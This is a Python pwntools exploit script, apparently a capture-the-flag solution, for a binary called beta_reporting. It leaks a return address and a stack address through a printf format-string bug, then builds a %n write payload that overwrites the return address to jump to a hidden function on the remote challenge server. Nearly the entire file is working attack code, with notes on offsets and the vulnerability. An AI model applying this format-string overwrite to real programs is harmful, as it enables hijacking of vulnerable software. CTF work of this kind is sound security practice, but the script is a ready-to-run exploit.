from pwn import *

script='''tui enable
layout a
layout r
b *viewreport+408
'''

# b userchoice
# b magicfunction
# b *viewreport+364

# Notes:
# printf in viewreport() is vulnerable to format string attack. also doesn't check whether 500 bytes is exceeded.
# So we call magicfunction to overwrite global variable, then use format string to *somehow* call unknownfunction...

# addresses and shit:
# 0xffd5bd10: string goes here
# 0xffd5be4c: return address goes here

# %79$x leaks return address: userchoice+132=0x8048b2b
# unknownfunction is at 0x80488f7

# we also need a stack address to be leaked: %78$x looks like stack address of base pointer

def leak_addr(targ,msg,reportNum,name="aaaabbbbcccc",isSilent=False):
    """
    %79$x leaks return addr
    %78$x leaks stack address, returns 0xfff1db68. address of return pointer is 0xfff1db4c
    """
    targ.recvuntil("Enter your choice:")
    targ.sendline("1")
    targ.recvuntil("report:\n")
    targ.sendline(msg) 
    targ.recvuntil("Enter your choice:")
    targ.sendline("2")
    targ.recvuntil("name:")
    targ.sendline(name)
    targ.recvuntil("menu:")
    targ.sendline(str(reportNum))
    if isSilent:
        targ.sendline("0")
        return 1
    targ.recvuntil("details:")
    targ.recvline()
    addr=int(targ.recvuntil("\n").strip(),16)
    targ.sendline("0")
    return addr

# for testing locally
# targ=gdb.debug(["./beta_reporting"],gdbscript=script)
# targ=process("./beta_reporting")

# for getting actual flag
targ=remote("yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg",30121)

# set up magic variable
targ.recvuntil("Enter your choice:")
targ.sendline("4")

# this leaks address of unknown_function, which we want to jump to
addr=leak_addr(targ,"%79$x",1)
OFFSET_1=0x8f7-0xb2b
unknown_addr=addr+OFFSET_1

# this leaks the stack address
stk_addr=leak_addr(targ,"%78$x",2)
OFFSET_2=0xb4c-0xb68
targ_addr=stk_addr+OFFSET_2

print("leaked return address:",hex(addr))
print("leaked stack address:",hex(stk_addr))
print("address to jump to:",hex(unknown_addr))
print("address to overwrite:",hex(targ_addr))
addrBytes=unknown_addr.to_bytes(4,"little")

# the only string we control on the stack is the name string, so we will put the return addr location in there
# name string is 8 bytes away
# full name string is 11, 12, 13, ... bytes away

name_payload=p32(targ_addr)+p32(targ_addr+1)+p32(targ_addr+2)+p32(targ_addr+3)

runningSum=0
payload=""

# we write the payload format string that allows us to replace the return address with the address of unknown function
# this loop generates payload
for i in range(4):
    
    writeNow=(int(addrBytes[i])-runningSum)%256
    if(writeNow<=32):
        writeNow+=256

    print(runningSum,int(addrBytes[i]),(int(addrBytes[i])-runningSum),writeNow)

    payload+="%{}x".format(writeNow)+"%{}$n".format(11+i)
    runningSum+=int(writeNow)
    # print(hex(runningSum%256))

# deliver payload
leak_addr(targ,payload,3,name_payload,isSilent=True)

targ.interactive()